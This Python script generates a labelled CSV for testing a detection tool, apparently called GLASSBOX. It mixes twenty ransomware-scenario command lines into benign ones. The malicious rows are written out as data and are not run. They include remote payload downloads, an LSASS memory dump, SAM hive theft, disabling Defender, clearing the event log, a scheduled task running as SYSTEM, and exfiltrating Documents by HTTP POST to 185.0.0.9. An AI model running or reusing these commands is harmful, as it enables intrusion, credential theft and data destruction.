#!/usr/bin/env python3
"""Generate a realistic 220-row demo CSV (20 malicious ransomware-scenario rows
blended into ~200 benign), with obfuscation + cross-row splitting, so you can
test GLASSBOX immediately. Mirrors what a Red-team LLM tool would emit."""
import csv
import random

random.seed(7)  # deterministic (Math.random-free environments friendly)

MALICIOUS = [
    # Execution / initial
    ("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA"),
    ("cmd.exe", 'cmd.exe /c "certutil -urlcache -split -f http://185.0.0.9/p.exe p.exe & p.exe"'),
    ("powershell.exe", 'p^o^w^e^r^s^h^e^l^l -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x/a.ps1\')"'),
    ("mshta.exe", 'mshta.exe javascript:a=GetObject("script:http://185.0.0.9/m.sct")'),
    # Discovery (density)
    ("cmd.exe", "whoami /all"),
    ("cmd.exe", "net user"),
    ("cmd.exe", 'net group "Domain Admins" /domain'),
    ("cmd.exe", "systeminfo"),
    ("cmd.exe", "tasklist /v"),
    ("cmd.exe", "nltest /dclist:"),
    # Privilege escalation
    ("cmd.exe", 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd /c m.exe" /f & fodhelper.exe'),
    # Credential access
    ("rundll32.exe", "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 C:\\temp\\l.dmp full"),
    ("cmd.exe", "reg save HKLM\\SAM C:\\temp\\sam.save"),
    # Defense evasion
    ("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true"),
    ("cmd.exe", "wevtutil cl Security"),
    # Persistence (split across rows: write then schedule)
    ("schtasks.exe", 'schtasks /create /tn "Updater" /tr "powershell -enc ZmFrZQ==" /sc onlogon /ru SYSTEM'),
    # Lateral movement
    ("wmic.exe", 'wmic /node:HOST process call create "cmd /c m.exe"'),
    # Collection + Exfil
    ("powershell.exe", "Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\temp\\d.zip"),
    ("powershell.exe", "Invoke-WebRequest -Uri http://185.0.0.9/up -Method POST -InFile C:\\temp\\d.zip"),
    # Impact (ransomware)
    ("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
]

BENIGN_TEMPLATES = [
    ("bash", "git pull origin main"),
    ("bash", "git commit -m 'fix: update readme'"),
    ("bash", "kubectl get pods -n prod"),
    ("bash", "docker ps -a"),
    ("bash", "sudo apt-get update"),
    ("bash", "npm install"),
    ("bash", "pip3 install requests"),
    ("bash", "ls -la /var/www"),
    ("bash", "systemctl status nginx"),
    ("bash", "terraform plan -out plan.tfdata"),
    ("powershell.exe", "Get-Process | Sort-Object CPU -Descending"),
    ("powershell.exe", "Get-Service | Where-Object {$_.Status -eq 'Running'}"),
    ("cmd.exe", "ipconfig /all"),
    ("python3", "python3 manage.py migrate"),
    ("node", "node server.js"),
    ("bash", "tar czf backup.tgz /etc/nginx"),  # benign tar -> tests FP control
    ("powershell.exe", "Invoke-WebRequest -Uri https://api.internal/health"),  # benign IWR -> FP control
    ("bash", "curl -s https://registry.npmjs.org/ > /dev/null"),  # benign curl -> FP control
    ("cmd.exe", "certutil -hashfile installer.msi SHA256"),  # benign certutil! -> FP control
    ("bash", "make build"),
]


def main(path="demo_attack.csv"):
    rows = []
    for p, c in MALICIOUS:
        rows.append((p, c, "malicious"))
    for _ in range(200):
        p, c = random.choice(BENIGN_TEMPLATES)
        rows.append((p, c, "benign"))
    random.shuffle(rows)
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["process_name", "command_line", "label"])
        w.writerows(rows)
    print(f"wrote {path}: {len(rows)} rows ({sum(1 for r in rows if r[2]=='malicious')} malicious)")


if __name__ == "__main__":
    main()
